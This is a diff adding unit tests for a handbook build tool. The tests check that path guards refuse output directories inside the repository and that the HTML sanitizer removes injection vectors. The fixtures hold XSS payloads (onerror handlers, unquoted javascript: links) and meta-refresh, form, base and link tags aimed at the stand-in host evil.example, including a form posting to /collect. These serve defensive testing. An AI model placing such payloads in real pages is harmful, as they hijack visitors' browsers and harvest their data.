@@ -425,6 +425,55 @@ describe('unit - handbook build guards', () => {
     assert.ok(fs.existsSync(canary), 'screenshot source must not be deleted');
   });
 
+  // B1: guard must refuse a path *under* a source, not only the source root.
+  it('refuses output dir nested under a discovery source without deleting it', function () {
+    const { fixture } = freshDirs();
+    populateValidFixture(fixture);
+    const nested = path.join(fixture, 'docs/handbook/screenshots/group');
+    const before = fs.readdirSync(nested).filter(n => n.endsWith('.png'));
+    assert.ok(before.length >= MIN_SCREENSHOTS, `fixture nested shots ${before.length}`);
+
+    const r = runBuild(nested, { HANDBOOK_REPO_ROOT: fixture });
+    assert.notStrictEqual(r.status, 0, r.stderr);
+    // Nested path is inside the repo (generic guard) — must not wipe PNGs.
+    assert.match(r.stderr, /inside the repository|discovery source/i);
+    const after = fs.readdirSync(nested).filter(n => n.endsWith('.png'));
+    assert.strictEqual(after.length, before.length, 'nested screenshot dir must not be emptied');
+  });
+
+  // B2: sources not listed in DISCOVERY_SOURCE_RELS (e.g. scripts/handbook).
+  it('refuses output dir equal to scripts/handbook without deleting it', function () {
+    const { fixture } = freshDirs();
+    populateValidFixture(fixture);
+    const scriptsHb = path.join(fixture, 'scripts/handbook');
+    fs.mkdirSync(scriptsHb, { recursive: true });
+    writeText(path.join(scriptsHb, 'CANARY.txt'), 'keep-build-sources\n');
+    writeText(path.join(scriptsHb, 'pod/tokens.css'), ':root{}\n');
+    const before = fs.readdirSync(scriptsHb, { recursive: true });
+
+    const r = runBuild(scriptsHb, { HANDBOOK_REPO_ROOT: fixture });
+    assert.notStrictEqual(r.status, 0, r.stderr);
+    assert.match(r.stderr, /inside the repository/i);
+    assert.match(r.stderr, /outside the repo/i);
+    assert.ok(fs.existsSync(path.join(scriptsHb, 'CANARY.txt')), 'scripts/handbook not emptied');
+    assert.strictEqual(fs.readFileSync(path.join(scriptsHb, 'CANARY.txt'), 'utf8'), 'keep-build-sources\n');
+    const after = fs.readdirSync(scriptsHb, { recursive: true });
+    assert.deepStrictEqual(after, before);
+  });
+
+  it('refuses any other path inside the repository without deleting it', function () {
+    const { fixture } = freshDirs();
+    populateValidFixture(fixture);
+    const inside = path.join(fixture, 'some/nested/out');
+    fs.mkdirSync(inside, { recursive: true });
+    writeText(path.join(inside, 'CANARY'), 'stay\n');
+
+    const r = runBuild(inside, { HANDBOOK_REPO_ROOT: fixture });
+    assert.notStrictEqual(r.status, 0, r.stderr);
+    assert.match(r.stderr, /inside the repository/i);
+    assert.ok(fs.existsSync(path.join(inside, 'CANARY')));
+  });
+
   it('rejects screenshot PNG just below MIN_PNG_BYTES', function () {
     const { fixture, out } = freshDirs();
     // Pin the threshold: size = MIN_PNG_BYTES - 1 (not a far-below value that
@@ -681,6 +730,115 @@ describe('unit - handbook build guards', () => {
     assert.match(scriptTags[0], /\bsrc\s*=/i, 'the only script must have src=');
     assert.match(scriptTags[0], /handbook\.js/i, 'script src must be handbook.js');
     assert.ok(!/<script\b(?![^>]*\bsrc\s*=)[^>]*>/i.test(html), 'no inline <script>');
+  });
+
+  // B3: slash as attribute separator + unquoted dangerous schemes.
+  it('strips slash-separated on* handlers and unquoted javascript schemes', function () {
+    const { fixture, out } = freshDirs();
+    const evilScheme = ['java', 'script', ':'].join('');
+    // These two vectors survived the old \\s+ / quoted-only sanitizer.
+    // Wrapped in block HTML so marked passes them through (bare
+    // `<img/onerror=…>` is escaped by marked, not shipped as a tag).
+    // Absolute src so integrity does not fail after onerror is stripped.
+    const danger =
+      '# Title\n\n' +
+      '<div><img/onerror=alert(1) src=https://example.com/x.png></div>\n\n' +
+      '<div><a href=' +
+      evilScheme +
+      'alert(2)>unquoted</a></div>\n\n' +
+      // Harmless markup must survive (counterdirection for over-eager filters).
+      '<p class="keep-me">SAFE-PARAGRAPH</p>\n' +
+      '<img src="https://example.com/ok.png" alt="ok">\n';
+    populateValidFixture(fixture, {
+      shotSize: MIN_PNG_BYTES + 1,
+      docContents: { 'DOC-0.md': danger },
+    });
+    const r = runBuild(out, {
+      HANDBOOK_REPO_ROOT: fixture,
+      NODE_PATH: markedNodePath,
+      GIT_SHA: 't',
+    });
+    assert.strictEqual(r.status, 0, r.stderr);
+    const html = fs.readFileSync(path.join(out, 'docs/DOC-0.html'), 'utf8');
+    assert.ok(!/onerror/i.test(html), 'slash-separated onerror must be stripped');
+    assert.ok(!new RegExp('java' + 'script:', 'i').test(html), 'unquoted javascript: neutralized');
+    assert.ok(html.includes('SAFE-PARAGRAPH'), 'harmless paragraph kept');
+    assert.ok(html.includes('class="keep-me"'), 'harmless class attr kept');
+    assert.match(html, /src="https:\/\/example\.com\/ok\.png"/);
+  });
+
+  // B4: meta refresh / form / base / link — not covered by script strip or CSP alone.
+  it('strips meta refresh, form, base and link tags from rendered docs', function () {
+    const { fixture, out } = freshDirs();
+    const danger =
+      '# Title\n\n' +
+      '<meta http-equiv="refresh" content="0;url=https://evil.example/">\n\n' +
+      '<form action="https://evil.example/collect"><input name="x"></form>\n\n' +
+      '<base href="https://evil.example/">\n\n' +
+      '<link rel="stylesheet" href="https://evil.example/x.css">\n\n' +
+      '<p>KEEP-AFTER-STRIP</p>\n';
+    populateValidFixture(fixture, {
+      shotSize: MIN_PNG_BYTES + 1,
+      docContents: { 'DOC-0.md': danger },
+    });
+    const r = runBuild(out, {
+      HANDBOOK_REPO_ROOT: fixture,
+      NODE_PATH: markedNodePath,
+      GIT_SHA: 't',
+    });
+    assert.strictEqual(r.status, 0, r.stderr);
+    const html = fs.readFileSync(path.join(out, 'docs/DOC-0.html'), 'utf8');
+    // Body must not retain the attack tags (page chrome may still have <meta charset>).
+    const body = html.replace(/^[\s\S]*?<body[^>]*>/i, '').replace(/<\/body>[\s\S]*$/i, '');
+    assert.ok(!/<meta\b/i.test(body), 'meta stripped from body');
+    assert.ok(!/<form\b/i.test(body), 'form stripped');
+    assert.ok(!/<base\b/i.test(body), 'base stripped');
+    assert.ok(!/<link\b/i.test(body), 'link stripped');
+    assert.ok(!/evil\.example/i.test(body), 'evil targets not left in body');
+    assert.ok(body.includes('KEEP-AFTER-STRIP'));
+  });
+
+  // B5: unbalanced <script> must fail loudly, not eat following content.
+  it('fails the build on unbalanced script blocks instead of silent content loss', function () {
+    const { fixture, out } = freshDirs();
+    const danger =
+      '# Title\n\n' + '<div><script>alert(7)</div>\n\n' + 'TAIL-CONTENT-SHOULD-SURVIVE\n\n' + '<div><script>x</script></div>\n';
+    populateValidFixture(fixture, {
+      shotSize: MIN_PNG_BYTES + 1,
+      docContents: { 'DOC-0.md': danger },
+    });
+    const r = runBuild(out, {
+      HANDBOOK_REPO_ROOT: fixture,
+      NODE_PATH: markedNodePath,
+      GIT_SHA: 't',
+    });
+    assert.notStrictEqual(r.status, 0, 'unbalanced script must fail the build');
+    assert.match(r.stderr, /unbalanced <script>/i);
+    // Output page must not be written half-sanitized (or, if written, not the only success path).
+    assert.ok(r.status !== 0, 'build must not exit 0 after silent content loss');
+  });
+
+  it('leaves a harmless document free of sanitizer damage', function () {
+    const { fixture, out } = freshDirs();
+    // Counterdirection: no attack vectors — body content must round-trip.
+    const clean = '# Clean Title\n\n' + 'Paragraph with **bold** and a [peer](./DOC-1.md) link.\n\n' + '- item one\n- item two\n';
+    populateValidFixture(fixture, {
+      shotSize: MIN_PNG_BYTES + 1,
+      docContents: { 'DOC-0.md': clean },
+    });
+    const r = runBuild(out, {
+      HANDBOOK_REPO_ROOT: fixture,
+      NODE_PATH: markedNodePath,
+      GIT_SHA: 't',
+    });
+    assert.strictEqual(r.status, 0, r.stderr);
+    const html = fs.readFileSync(path.join(out, 'docs/DOC-0.html'), 'utf8');
+    assert.match(html, /id="clean-title"/);
+    assert.match(html, /<strong>bold<\/strong>/);
+    assert.match(html, /href="DOC-1\.html"/);
+    assert.match(html, /item one/);
+    assert.match(html, /item two/);
+    assert.ok(!/stripped unresolved/i.test(r.stderr));
   });
 
   it('escapes HTML special characters in store field content on index', function () {
